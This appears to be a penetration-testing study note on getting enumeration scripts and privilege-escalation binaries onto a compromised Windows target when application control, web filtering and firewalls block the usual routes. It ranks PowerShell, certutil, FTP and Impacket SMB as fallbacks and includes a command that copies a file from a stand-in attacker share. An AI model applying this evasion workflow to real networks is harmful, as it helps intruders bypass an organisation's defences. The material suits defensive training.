### File Transfer Evasion and Methodology

File transfers are a critical component of post-exploitation, used to move enumeration scripts or privilege escalation binaries between the attack machine and the target. Successful transfers require navigating both host-level protections and network-level restrictions.

#### Factors Affecting Transfer Success

Before attempting a transfer, evaluate the environment for potential blockers:

|Control Type|Mechanism|Impact on File Transfer|
|:--|:--|:--|
|**Host Controls**|**Application Control Policy** / **Whitelisting**|Prevents the execution of common transfer tools like PowerShell.|
|**Host Controls**|**AV/EDR**|May block specific application activities or flag transferred binaries as malicious.|
|**Network Controls**|**Firewalls**|Blocks outbound traffic on specific ports (e.g., TCP 21).|
|**Network Controls**|**Web Content Filtering**|Prevents access to external sites used for hosting tools (GitHub, Dropbox, Google Drive).|
|**Network Controls**|**IDS / IPS**|Monitors and alerts on uncommon operations or signatures within the traffic.|

---

#### Methodology: Selecting a Transfer Technique

Follow this workflow when initial methods are blocked by security controls.

1. **Identify the Goal:** Determine if you need to move a script (e.g., `PowerUp.ps1`) for enumeration or a compiled binary (e.g., `PrintSpoofer`) for escalation.
2. **Test Native Binaries:** Attempt to use built-in OS tools first, as they are part of core functionality.
    - **PowerShell:** Use for script execution and transfers unless blocked by **Application Control Policy**.
    - **Certutil:** Use to download files directly from external URLs if **Web Content Filtering** is not present.
3. **Evaluate Outbound Ports:** If native web-based downloads fail, test common protocols and ports.
    - Check if **Port 21 (FTP)** is allowed through the network firewall.
    - Check if **Port 445 (SMB)** is open for outbound traffic.
4. **Execute Transfer:** Use the identified open pathway to move the necessary tools to the target.

---

#### Command Reference & Scenario Context

|Technique|Scenario / Context|Result in Provided Source|
|:--|:--|:--|
|**PowerShell**|Standard transfer for scripts (e.g., `PowerUp.ps1`).|**Failed:** Blocked by Application Control Policy.|
|**Certutil**|Downloading compiled binaries from public repos (e.g., GitHub).|**Failed:** Blocked by Web Content Filtering.|
|**FTP Client**|Outbound file transfer via standard protocol.|**Failed:** Port 21 (TCP) blocked by network firewall.|
|**SMB (Impacket)**|Use when outbound Port 445 is permitted.|**Success:** Allowed successful binary copy.|

**Operational Steps for SMB Transfer:** _When other outbound ports (21, 80, 443) are restricted, SMB may remain open to facilitate internal networking._

1. Set up the SMB server on the attack machine to share a local folder.
2. Connect to the share from the target machine and copy the required binary.

```
# Example of using SMB to move a file to the target
copy \\<ATTACK_IP>\<SHARE_NAME>\<FILENAME> .
```

---

#### Decision Points

- **Use SMB** when you have confirmed that outgoing traffic to **TCP port 445** is allowed while other ports like **21** are blocked.
- **Avoid External Repositories** if the organization has **strong web content filtering**; instead, host the files on a controlled `<ATTACK_IP>`.